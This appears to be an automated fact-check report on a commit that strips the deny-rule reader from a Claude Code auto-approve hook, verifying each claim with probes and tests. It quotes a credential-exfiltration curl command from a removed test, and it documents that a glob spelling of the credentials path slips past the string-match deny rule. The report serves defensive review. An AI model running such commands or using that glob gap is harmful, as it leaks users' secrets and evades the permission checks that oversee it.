Commit: ed06dec1

# Code Fact-Check Report

**Repository:** /workspace/.claude/wt-q092 (branch fix/q092-drop-hook-deny-reader)
**Scope:** `git diff 1a831ffe..ed06dec1` (Q-092 unit 2) plus the commit message of ed06dec1; unit 1 (1a831ffe on 00a27a2f) read as context only
**Checked:** 2026-10-15
**Replication:** k=1 (loop pass, decision 031)
**Commit:** ed06dec1
**Total claims checked:** 23 (22 numbered; Claim 12 split into 12a/12b)
**Summary:** 19 verified, 3 mostly accurate, 0 stale, 0 incorrect, 1 unverifiable

Execution logs (all under `/home/node/.claude/jobs/00bcf178/tmp/q092/agents/code-fact-check-report-q092b-2026-10-15/`, the job temp dir the preamble assigns; the guard hook blocks Bash writes into `docs/reviews/execution-logs/` under a `.claude` path, so the logs stay there):

- `probe.sh` / `probe-out.txt`: `timeout 300 bash probe.sh`, cwd `$D/p/proj` (a fresh git repo), exit 0, 2026-10-15T04:43:13-07:00. Sections A-F below.
- `probe3.sh` / `exit-codes.txt`: `timeout 120 bash probe3.sh`, exit 0, 2026-10-15T04:46:10-07:00.
- `bats-auto-approve.txt`: `timeout 600 bats test/auto-approve-allowed-commands.bats`, cwd worktree, exit 0 (33/33), 2026-10-15T04:43:51-07:00.
- `bats-linker.txt`: `timeout 600 bats test/link-claude-home-wiring.bats`, cwd worktree, exit 0 (16/16), same run.
- `probe2.sh` / `bats-old-hook.txt`: ed06dec1's test file run against the 1a831ffe hook, exit 1 (only test 10 fails), 2026-10-15T04:44:20-07:00.

Hallucination log `docs/reviews/hallucination-patterns.md` read: 8 entries, none about hooks, jq, deny rules or bash. No claim below matches one.

---

## Claim 1: "the deny reader, `--deny` and the de-quoted matching are removed. The hook emits only `allow` or nothing (never `ask`, ...; a test pins its stdout), so each deny rule now has one interpreter, Claude Code's. The hook still fails closed on an unreadable or ill-shaped settings file."

**Location:** `docs/decisions/log.md:76` (Amended 2026-10-15 (Q-092))
**Type:** Behavioral / Reference
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers each sentence of the 2026-10-15 amendment except the glob clause (Claim 3) and the not-verified-on-a-host clause, which is correctly marked unverified; does not establish Claude Code's own matcher behavior.

Sentence by sentence:
- Removed: unit 1 removed `--deny` and the de-quoted match (`git show 1a831ffe --stat`, commit body: "drop the --deny option and the de-quoted deny match"). Unit 2 removed `DENY_GLOBS`, `add_deny_rule`, `matches_deny` and both calls (diff of `hooks/auto-approve-allowed-commands.sh`, removed lines `-matches_deny() {` and `-  if matches_deny "$command"; then`).
- "a test pins its stdout": the test is in **unit 1**, `test/auto-approve-allowed-commands.bats:147` `@test "the hook's stdout is empty or exactly the allow decision: never ask, deny or defer"`. It is still present at ed06dec1 and passes (`bats-auto-approve.txt`). The sentence names no unit, so it is accurate.
- Fails closed: probe section B. A good global file plus a project file with `deny:"x"`, `{}`, `[1]` or bad JSON gives `[DEBUG] A settings file could not be read or parsed: approving nothing` / `Loaded 0 allowed prefixes` and no allow.
- "which the hook used to send to the prompt": before unit 1 the de-quoted match covered `.cred""entials.json`, and the per-command `matches_deny "$full_command"` call (removed at old `:430`) covered a denied subcommand in a list.

**Evidence:** `docs/decisions/log.md:76`, `test/auto-approve-allowed-commands.bats:147-168`, `hooks/auto-approve-allowed-commands.sh:216-232`, `probe-out.txt` §B, `bats-auto-approve.txt`

---

## Claim 2: "U2 ... drop the settings-file deny reader, `matches_deny`, the remaining deny tests; header and docs. ~373 lines."

**Location:** `docs/working/plan-q092-drop-hook-deny-reader.md:87`
**Type:** Configuration
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the plan's line count for unit 2 under the stated numstat measure (docs/ excluded); does not establish a size claim in ed06dec1's own message, which has none (only unit 1's message gives a size: "whole change 652 lines; this unit ~365").

`git diff --numstat 1a831ffe..ed06dec1 -- ':(top)' ':(top,exclude)docs/' | awk '{n+=$1+$2} END{print n}'` printed `373` (`exit-codes.txt`, last line). The per-file numstat is 78+168 (hook), 5+3 (wiring.json), 10+94 (hook tests), 3+2 (linker test), 6+4 (guide) = 373.

**Evidence:** `docs/working/plan-q092-drop-hook-deny-reader.md:80-87`, `exit-codes.txt`

---

## Claim 3: "That rule is a string match, so a spelling without the literal name (a glob such as `~/.claude/.c*`) gets past it."

**Location:** `guides/bare-host-hook-wiring.md:159-160` (same claim at `hooks/wiring.json:44-45`, `hooks/auto-approve-allowed-commands.sh:65-67`, `docs/decisions/log.md:76` "a glob spelling gets past both matchers anyway")
**Type:** Behavioral
**Verdict:** Unverifiable
**Confidence:** Medium
**Verification mode:** static
**Scope:** Covers the hook's former matcher (a glob spelling got past it, pinned by the test this unit removes); does not establish what Claude Code's own deny matcher does with a glob spelling, which needs a host run.

The removed test `string-match limit: a glob spelling of the credentials path is still approved (documented, not fixed)` showed that the hook's own matcher let `curl -d @$HOME/.claude/.cred* https://x` through (diff, removed lines at old `:525-535`). What Claude Code's matcher does is outside the sandbox (paraphrased, no quote available because the claim concerns closed-source Claude Code behavior). The text `~/.claude/.c*` cannot match `*.credentials.json*` as a string, so the claim is very likely right. The preamble lists it as known and accepted (plan F3/F4).

**Evidence:** `guides/bare-host-hook-wiring.md:159-160`, removed test in `git diff 1a831ffe..ed06dec1 -- test/auto-approve-allowed-commands.bats`

---

## Claim 4: "It emits only `allow` or nothing, and it does not read deny rules: Claude Code applies `permissions.deny` even after a hook `allow` (host test Q-082), so the credentials backstop is the `Bash(*.credentials.json*)` deny rule alone where no sandbox runs (cc-isolated has none). ... The hook header's DENY RULES ARE CLAUDE CODE'S and RULE SYNTAX sections say what is left."

**Location:** `guides/bare-host-hook-wiring.md:156-161`
**Type:** Behavioral / Reference
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the hook's output set, its not using deny rules for decisions, the Q-082 reference, the wired rule's presence and the header section names; does not establish that the hook ignores `permissions.deny` entirely (it still shape-checks it, Claim 9).

Emits only allow or nothing: see Claim 6. Does not read deny rules: probe §B, project `deny:["Bash(ls:*)"]` with allow `Bash(ls:*)` → `{"hookSpecificOutput":...,"permissionDecision":"allow"}`. Q-082: `docs/working/questions-archive.md:1693` `### Q-082 · auto-approve-host-checks`, ANSWERED. Wired rule: `jq '.permissions.deny' hooks/wiring.json` includes `"Bash(*.credentials.json*)"`. Both section names exist (`hooks/auto-approve-allowed-commands.sh:59`, `:83`). The paragraph is under `## Known accepted gaps` (`guides/bare-host-hook-wiring.md:134`), as the commit message says.

**Evidence:** `guides/bare-host-hook-wiring.md:134`, `:156-161`; `hooks/wiring.json:2-3` of `.permissions.deny`; `probe-out.txt` §B

---

## Claim 5: "Dynamically reads allow rules from (SETTINGS SOURCES below)"

**Location:** `hooks/auto-approve-allowed-commands.sh:4`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers which rule kind is consumed; does not establish that deny is unread (it is shape-checked, Claim 9).

```bash
# hooks/auto-approve-allowed-commands.sh:231
  for rec in "${records[@]}"; do add_allow_rule "$rec"; done
```
That loop consumes the only records `SETTINGS_RULES_JQ` emits (`:148`, allow strings).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:136-153`, `:216-232`

---

## Claim 6: "ROLE: AN ALLOW-ONLY CONVENIENCE LAYER (Q-092). The hook emits one decision, "allow", or nothing (exit 0 with no output, so Claude Code's own rules and prompt decide). It never emits "ask", "deny" or "defer"."

**Location:** `hooks/auto-approve-allowed-commands.sh:50-52`
**Type:** Invariant
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers stdout and the exit status of `main` on every input Claude Code sends (a JSON object) under jq 1.6 and bash 5.2; does not establish the exit status on malformed stdin under other jq versions (here 4 or 5, not 0) or that `parse_commands` is unreachable other than through argv.

The source contains one decision string: `grep -o '"permissionDecision":"[a-z]*"'` → `1 "permissionDecision":"allow"` (`exit-codes.txt`). It is printed only at

```bash
# hooks/auto-approve-allowed-commands.sh:350-357
  if $all_allowed; then
    debug "Decision: ALLOW (all commands passed)"
    echo '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow"}}'
  else
    debug "Decision: BLOCK (falling through to normal permission check)"
  fi

  exit 0
```
`main` (`:262-358`, read in full) has five other exits, all `exit 0` without stdout: no jq (`:283`), no command (`:296`), no prefixes (`:306`), parse failure (`:324`), nothing extracted (`:336`). The `set -e` failures observed are from the stdin parse at `:289` (`command=$(echo "$input" | jq -r ...)`): `not json` → rc 4, `[1]` and `{"tool_input":5}` → rc 5, with empty stdout. A missing `--permissions` value hits `set -u` at `:271` → rc 1. No path produced exit 2 (the blocking status). The extraction and shape checks run inside a process substitution checked by `wait $!` or under `if`, so their failures do not trip `set -e` in `main`.

`parse_commands` (`:810-854`, which can `exit 2` from `check_deps` at `:458`) runs only when argv[1] is `parse_commands` (`:856-859`). The wiring passes no arguments: `"command": "bash {{CLAUDE_DIR}}/hooks/auto-approve-allowed-commands.sh"` (`hooks/wiring.json:80`).

The parenthetical "exit 0 with no output" holds for every JSON object; Claude Code sends nothing else.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:262-358`, `:445-460`, `:810-864`; `hooks/wiring.json:80`; `exit-codes.txt`

---

## Claim 7: "a hook "ask" overrides permissions.deny (Claude Code issue #39344), but a hook "allow" does not (host test Q-082, 2026-09-28; decision log row 53). cc-isolated has no sandbox (Q-081, Q-125)"

**Location:** `hooks/auto-approve-allowed-commands.sh:53-55`
**Type:** Reference
**Verdict:** Verified
**Confidence:** Medium
**Verification mode:** static
**Scope:** Covers the in-repo references (Q-082's date and result, row 53, Q-081, Q-125); does not establish issue #39344's content, which needs network access and is taken as recorded elsewhere in the repo (`hooks/wiring.json` `_comment`, decision 023 Amendment B).

`docs/working/questions-archive.md:1698` reads "**2026-09-28, first run ...**", and row 53's 2026-09-28 amendment reads "Under a PreToolUse hook that always returned `allow`, a Bash call matching `permissions.deny` was still denied". Q-081 is `questions-archive.md:1596` `### Q-081 · cc-isolated-sandbox-half`. Q-125 is `questions.md:455` `### Q-125 · build-cc-isolated-sandbox`, Status OPEN.

**Evidence:** `docs/working/questions-archive.md:1596`, `:1693-1698`; `docs/working/questions.md:455-461`; `docs/decisions/log.md:76`

---

## Claim 8: "DENY RULES ARE CLAUDE CODE'S (Q-092). The hook used to read Bash deny rules itself and never approve a match, raw or de-quoted. ... The hook used to send both to the prompt. A spelling that never contains the denied string ... got past both matchers before and still does"

**Location:** `hooks/auto-approve-allowed-commands.sh:59-67`
**Type:** Behavioral / Staleness
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the hook's former behavior (the removed raw and per-command `matches_deny` calls, unit 1's de-quoted match) and the fact that the current hook ignores deny rules; Claude Code's half of "both matchers" is Claim 3.

The removed code at old `:416-421` (`if matches_deny "$command"; then ... exit 0`) and old `:430-433` (per extracted command) sent a raw or subcommand match to the prompt. Running the new test against the unit-1 hook fails only test 10 (`bats-old-hook.txt`: `not ok 10 deny rules in the settings files no longer change the hook's decision (Q-092)`), so the reader really was live until this unit. It passes at ed06dec1.

**Evidence:** `git diff 1a831ffe..ed06dec1 -- hooks/auto-approve-allowed-commands.sh`, `bats-old-hook.txt`, `bats-auto-approve.txt`

---

## Claim 9: "permissions.deny is checked for shape only (an array of strings) and emits nothing" / header "permissions.deny is shape-checked but not read"

**Location:** `hooks/auto-approve-allowed-commands.sh:134-135` (also `:69-73`)
**Type:** Behavioral
**Verdict:** Mostly accurate
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the jq check's result for deny = string, object, number, boolean, null, `[]`, `[1]`, `["a",null]`, `[""]`-style string arrays; does not establish whether Claude Code rejects a settings file with `deny: false`.

```jq
# hooks/auto-approve-allowed-commands.sh:145-146
  elif ((.deny // []) | type != "array" or any(.[]; type != "string"))
    then error("permissions.deny is not an array of strings")
```
In jq 1.6 `type != "array" or any(...)` short-circuits, so a non-array never reaches `.[]`. Probe §A (good file, then bad file): `"x"`, `{}`, `5`, `""`, `true`, `[1]` and `["a",null]` raise the error; `[]` and `["Bash"]` pass and emit only allow rules. **`null` and `false` also pass**, because `.deny // []` maps both to `[]`. So "an array of strings" really means an array of strings, absent, null or `false`. The allow side has the same `//` behavior (`:148`), and so did the deny side before this unit (old `(.deny // []) | if type == "array"`), so nothing has regressed. The precise version: "an array of strings (null or false count as absent)". Deny emits nothing: §B shows `Loaded 1 allowed prefixes` with one allow rule and a deny list.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:136-153`, `probe-out.txt` §A-B

---

## Claim 10: "FAILS CLOSED on its inputs: if any settings file below exists but cannot be read, does not hold exactly one JSON object, or has permissions, permissions.allow or permissions.deny of the wrong shape, no command is approved on that call."

**Location:** `hooks/auto-approve-allowed-commands.sh:69-72`
**Type:** Error-handling
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the jq error → `wait $!` → empty ALLOW_PREFIXES → `exit 0` path, including records printed before the error; "wrong shape" here is the code's definition, with Claim 9's null/false nuance.

Probe §A shows jq printing the good file's records before it errors on the bad file (`Bash(ls:*)|Bash(cat:*)|` after the error message). `load_rules` discards them:

```bash
# hooks/auto-approve-allowed-commands.sh:225-231
    mapfile -d '' records < <(read_settings_rules)
    if ! wait $!; then
      debug "A settings file could not be read or parsed: approving nothing"
      return 0
    fi
  fi
  for rec in "${records[@]}"; do add_allow_rule "$rec"; done
```
The `return 0` skips the loop, so ALLOW_PREFIXES stays empty and `main` exits at `:304-307`. In §B, a good global file plus a bad project file gives `Loaded 0 allowed prefixes`, which confirms the load_rules comment at `:214-215` ("not even the records jq printed before its error").

**Evidence:** `hooks/auto-approve-allowed-commands.sh:112-114`, `:211-232`, `:302-307`; `probe-out.txt` §A-B

---

## Claim 11: "SETTINGS SOURCES. ... (an empty value falls back; a relative value approves nothing) ... One jq call reads all of them (SETTINGS_RULES_JQ). --permissions replaces all three. Managed settings and --settings files are not read, so their allow rules approve nothing here."

**Location:** `hooks/auto-approve-allowed-commands.sh:75-81` (with `:160-166`, `:211-212`)
**Type:** Configuration / Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the three paths, the empty/relative CLAUDE_CONFIG_DIR cases, --permissions skipping the files, and the absence of any other source; does not establish how Claude Code itself resolves a relative CLAUDE_CONFIG_DIR.

`settings_files` prints exactly three paths (`:123-124`). Probe §C: a relative value gives `CLAUDE_CONFIG_DIR is relative: approving nothing`, and an empty value falls back to `$HOME/.claude/settings.json`. §D: with `--permissions '["Bash(ls:*)"]'` and a project file of `{bad`, the result is `Using custom permissions`, `Loaded 1 allowed prefixes`, allow, and no `Reading rules` line. That works because the reader is in the `else` branch (`:224-230`). Nothing in the file reads a managed-settings path or a `--settings` file (paraphrased, no quote available because the claim is about code that is absent; `settings_files` is the only source of paths). The global path matches the linker: `DEST="${CLAUDE_CONFIG_DIR:-$HOME/.claude}"` / `SETTINGS="$DEST/settings.json"` (`devcontainer-config/link-claude-home.sh:36`, `:92`), which supports the `settings_files` comment at `:116-119`.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:116-125`, `:157-184`, `:216-232`; `devcontainer-config/link-claude-home.sh:36`, `:92`; `probe-out.txt` §C-D

---

## Claim 12a: "RULE SYNTAX. parse_bash_rule reads `Bash(BODY)`, with a trailing legacy `:*` stripped from BODY, or a bare `Bash`; anything else ... is not a Bash rule. ... Bash(ls) prefix: `ls`, `ls -la` (not `ls/x` ...) / Bash(rm:*) word prefix: `rm x`, not `rmdir` / Bash ignored"

**Location:** `hooks/auto-approve-allowed-commands.sh:83-89`, `:91` (and parser comment `:186-188`)
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers parse_bash_rule after RULE_LEGACY's removal and the four table rows other than `Bash(ls *)`; does not establish Claude Code's own reading of these rules.

```bash
# hooks/auto-approve-allowed-commands.sh:196-200
  [[ "$rule" == "Bash("*")" ]] || return 1
  RULE_BODY=${rule#Bash\(}
  RULE_BODY=${RULE_BODY%\)}
  RULE_BODY=${RULE_BODY%:\*}
  return 0
```
Probe §F: `Bash(ls:*)` → body `ls`; `Bash(ls)` → `ls`; `Bash(a:*:*)` → `a:*` (exactly one trailing `:*` is stripped); bare `Bash` → bare=true. §E: `Bash(ls)` approves `ls` and `ls -la` but not `ls/x`; `Bash(rm:*)` approves `rm x` but not `rmdir x`; `Bash`, `Read(x)` and `Bash(ls` approve nothing. `rg RULE_LEGACY` outside reviews and archive finds no reference. The old conditional strip and the unconditional `%:\*` behave the same (a `%` pattern that does not match is a no-op).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:186-209`, `probe-out.txt` §E-F

---

## Claim 12b: "Bash(ls *)   the literal text `ls *`: approves nothing (use `Bash(ls:*)`)"

**Location:** `hooks/auto-approve-allowed-commands.sh:90`
**Type:** Behavioral
**Verdict:** Mostly accurate
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers what this hook approves under the rule; does not establish whether `ls *` matters in practice. The row's text was reworded in this diff, but the imprecision predates it (old row: "literal `ls *`: approves nothing").

Probe §E: `--permissions '["Bash(ls *)"]'` approves the command `ls *`. The body is the prefix `ls *` (`:199`), and `is_command_allowed` matches `"$full_command" == "$allowed"` (`:251`) on the extracted text `ls *`, which the shape filter allows (Lit words). It also approves `ls * <args>`. So the rule approves the literal command `ls *` (which bash glob-expands), not nothing. The test `rule table: Bash(ls *) approves nothing` (`test/auto-approve-allowed-commands.bats:303-305`) checks only `ls -la`. The precise version: "approves only commands that begin with the literal text `ls *`; not a glob (use `Bash(ls:*)`)".

**Evidence:** `hooks/auto-approve-allowed-commands.sh:90`, `:199`, `:251-252`; `test/auto-approve-allowed-commands.bats:303-305`; `probe-out.txt` §E

---

## Claim 13: "A relative CLAUDE_CONFIG_DIR resolves against this hook's cwd, not the linker's, so it could name some other directory's settings.json and add its allow rules: fail closed." / "A settings path contains a newline: approving nothing"

**Location:** `hooks/auto-approve-allowed-commands.sh:160-174`
**Type:** Error-handling
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the relative-value check (run) and the newline check (read); does not establish the newline case by execution.

Relative: `if [[ -n "${CLAUDE_CONFIG_DIR:-}" && "$CLAUDE_CONFIG_DIR" != /* ]]; then ... return 1` (`:163-165`), observed in probe §C. Newline: `if [[ "$f" == *$'\n'* ]]; then ... return 1` (`:171-173`) applies to every candidate path, including an absolute CLAUDE_CONFIG_DIR with a newline. Both return 1, and `load_rules` approves nothing (Claim 10).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:157-184`, `probe-out.txt` §C

---

## Claim 14: "Claude Code applies it even after auto-approve-allowed-commands.sh says allow (host test Q-082), so that hook does not read deny rules (Q-092). It is a string match ...; see that hook's header, DENY RULES ARE CLAUDE CODE'S."

**Location:** `hooks/wiring.json:42-46` (`_comment`)
**Type:** Reference / Behavioral
**Verdict:** Verified
**Confidence:** Medium
**Verification mode:** static
**Scope:** Covers the Q-082 reference, the hook's not reading deny rules, and the header section name; the string-match/glob clause is Claim 3. Q-082 tested a stand-in always-allow hook, not this script, so "after auto-approve-allowed-commands.sh says allow" rests on the decision being the same JSON.

Q-082's decisive test used a hook that always returned allow (`docs/decisions/log.md:76`: "Under a PreToolUse hook that always returned `allow`"). This hook's allow output is the same JSON (`:352`). The header section exists (`hooks/auto-approve-allowed-commands.sh:59`).

**Evidence:** `hooks/wiring.json:39-46`, `docs/working/questions-archive.md:1693-1698`, `hooks/auto-approve-allowed-commands.sh:59`, `:352`

---

## Claim 15: "# --- Deny rules are Claude Code's (Q-082, Q-092) --- ... So it no longer reads deny rules: Claude Code applies them after the hook says "allow"." plus the new test "deny rules in the settings files no longer change the hook's decision (Q-092)"

**Location:** `test/auto-approve-allowed-commands.bats:114-117`, `:170-180`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the comment and the test's ability to discriminate the old reader from the new hook; does not establish Claude Code's side ("Claude Code applies them"), which rests on Q-082.

The test puts `Bash(*.credentials.json*)` and bare `Bash` in the global deny list and `Bash(ls:*)` in both the project allow and deny lists, then requires `approved` for `$PLAIN` and `ls -la`. It passes at ed06dec1 (`bats-auto-approve.txt`, `ok 10`) and fails against the 1a831ffe hook (`bats-old-hook.txt`, `not ok 10`, all other tests ok).

**Evidence:** `test/auto-approve-allowed-commands.bats:114-180`, `bats-auto-approve.txt`, `bats-old-hook.txt`

---

## Claim 16: "Claude Code applies it even after the auto-approve hook says allow (host test Q-082), so the hook no longer reads it (Q-092)."

**Location:** `test/link-claude-home-wiring.bats:268-270`
**Type:** Reference
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the comment's references and the test it annotates still passing; Claude Code's side rests on Q-082 as in Claim 14.

The test asserts the rule is merged exactly once (`select(. == "Bash(*.credentials.json*)")] | length ... -eq 1`), and it passes (`bats-linker.txt`, 16/16).

**Evidence:** `test/link-claude-home-wiring.bats:266-275`, `bats-linker.txt`

---

## Claim 17: "the hook no longer reads Bash deny rules from the settings files: DENY_GLOBS, add_deny_rule, matches_deny and both of its calls are gone, so each deny rule has one interpreter."

**Location:** commit ed06dec1 message, lines 3-6 of the body
**Type:** Staleness / Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers removal from the hook and the absence of live descriptions of a hook deny reader anywhere in the repo outside docs/reviews, archive, questions/archives, the plan and decision-log history; historical text inside row 53's earlier amendments is left as history.

`rg -n -i "deny reader|WHAT THE DENY CHECK|de-quoted|dequoted|matches_deny|DENY_ALL|DENY_GLOBS|add_deny_rule|--deny\b|reads (Bash )?deny rules|checks .?Bash.? deny|deny check"` (excluding docs/reviews, archive, questions-archive) finds only: row 53 (earlier amendments plus the new one), Q-092's own text in `questions.md`, the header's past-tense "raw or de-quoted" (`:60`), the test comment at `:117` ("no longer reads"), and the `--deny`-ignored test (`:182-184`). A wider sweep of every file mentioning `auto-approve` together with "deny" found no live claim that the hook reads deny rules (paraphrased, no quote available because the claim is that no such text exists).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:59-67`, `test/auto-approve-allowed-commands.bats:117`, `:182-184`, `docs/decisions/log.md:76`

---

## Claim 18: "It still fails closed on its inputs: an unreadable or ill-shaped settings file, including a permissions.deny that is not an array of strings, leaves no allow rules."

**Location:** commit ed06dec1 message, body paragraph 2
**Type:** Error-handling
**Verdict:** Mostly accurate
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the fail-closed path (Claim 10) and the deny shape check (Claim 9); `deny: null` and `deny: false` are not arrays of strings, yet they are accepted as absent.

Probe §A: `deny=null` and `deny=false` → all allow rules are emitted, no error. Every other non-array-of-strings value fails closed (§A-B). Precise version: "a permissions.deny that is present (not null/false) and not an array of strings". This matches the allow side and the pre-change deny side.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:145-148`, `probe-out.txt` §A

---

## Claim 19: "A relative or newline-bearing CLAUDE_CONFIG_DIR still approves nothing, now because a wrongly resolved file could add allow rules. With --permissions the settings files are no longer read."

**Location:** commit ed06dec1 message, body paragraph 2
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Same coverage as Claims 11 and 13 (the newline case read, not run).

See Claim 11 §C/§D and Claim 13.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:160-174`, `:219-230`; `probe-out.txt` §C-D

---

## Claim 20: "Header: ROLE and DENY RULES ARE CLAUDE CODE'S replace the load-bearing note, WHAT THE DENY CHECK GUARANTEES and RESIDUALS; the rule table keeps its allow column only. Docs: wiring.json _comment, the bare-host guide's known gaps, the linker test comment, decision log row 53 (amended)."

**Location:** commit ed06dec1 message, body paragraph 3
**Type:** Architectural
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers the inventory of header and doc changes against `git show --stat ed06dec1`; does not judge content (other claims do that).

The diff removes `# ROLE: A CONVENIENCE LAYER ... SECURITY CONTROL IN CC-ISOLATED`, `# WHAT THE DENY CHECK GUARANTEES.` and `# RESIDUALS`, adds ROLE, DENY RULES ARE CLAUDE CODE'S and a separate FAILS CLOSED paragraph (not named in the message), and drops the "as deny" column. The stat lists exactly the four named docs plus the hook and its test.

**Evidence:** `git show --stat ed06dec1`, `hooks/auto-approve-allowed-commands.sh:50-91`

---

## Claim 21: "No gate trailer: hooks/, test/, guides/ and docs/ are outside live-verify-gate's sets."

**Location:** commit ed06dec1 message, Notes
**Type:** Configuration
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers the two path regexes; does not re-run the gate.

```bash
# hooks/live-verify-gate.sh:83, :91
enforcement='^devcontainer-config/(Dockerfile|devcontainer\.json|init-firewall\.sh|cc-sni-proxy\.py|link-claude-home\.sh|cc-isolated\.sh|install\.sh$|egress/)'
host_tools='^devcontainer-config/(cc-exit-scan\.sh|cc-gitdir\.sh|cc-push\.sh)'
```
Every changed file is outside `devcontainer-config/`.

**Evidence:** `hooks/live-verify-gate.sh:83-94`

---

## Claim 22: "wiring.json changes only _comment, which the linker does not merge."

**Location:** commit ed06dec1 message, Notes
**Type:** Architectural
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the wiring.json hunk and the linker's key filter; does not establish anything about other `_`-prefixed keys.

The diff's only wiring.json hunk is in the `_comment` array (lines 39-46). The linker drops every top-level key that starts with `_`:

```jq
# devcontainer-config/link-claude-home.sh:134-136 (excerpt ends :136; enclosing jq program continues to :163 — read)
          ($w[0]
           | with_entries(select(.key | startswith("_") | not))
```
`test/link-claude-home-wiring.bats:122-127` (`_comment is stripped`) passes (`bats-linker.txt`).

**Evidence:** `devcontainer-config/link-claude-home.sh:108-170`, `test/link-claude-home-wiring.bats:122-133`, `bats-linker.txt`

---

## Claims Requiring Attention

### Incorrect
(none)

### Stale
(none)

### Mostly Accurate
- **Claim 9** (`hooks/auto-approve-allowed-commands.sh:134-135`): "an array of strings": `deny: null` and `deny: false` also pass (`.deny // []`). Say null/false count as absent.
- **Claim 12b** (`hooks/auto-approve-allowed-commands.sh:90`): `Bash(ls *)` does approve the literal command `ls *` (and `ls * x`), not nothing. Wording predates this diff; the table test checks only `ls -la`.
- **Claim 18** (commit ed06dec1 message, paragraph 2): "a permissions.deny that is not an array of strings" fails closed, except null/false, which are accepted as absent.

### Unverifiable
- **Claim 3** (`guides/bare-host-hook-wiring.md:159-160`, and the same clause in wiring.json, the header and row 53): what Claude Code's own matcher does with a glob spelling needs a host run. Already accepted (plan F3/F4).

---

## Goal-Alignment Note

The goal is to land Q-092 unit 2 clean: remove the hook's Bash deny reader, given Q-082's result that `permissions.deny` beats a hook `allow`. The code does what the unit says. The hook prints only the allow JSON or nothing, and no path from `main` exits 2. Deny rules no longer affect its decision, and the new test catches the old reader (it fails on 1a831ffe). Unreadable or ill-shaped settings files still leave no allow rules, even when jq printed records before its error. No live text in the repo still says the hook reads deny rules. Nothing is Incorrect or Stale. The three Mostly-accurate items are wording only: the null/false deny shape (also true before this unit) and the long-standing `Bash(ls *)` row. Neither changes behavior or widens what the hook approves. Both can be fixed in one line each if the author wants. Neither blocks the goal.
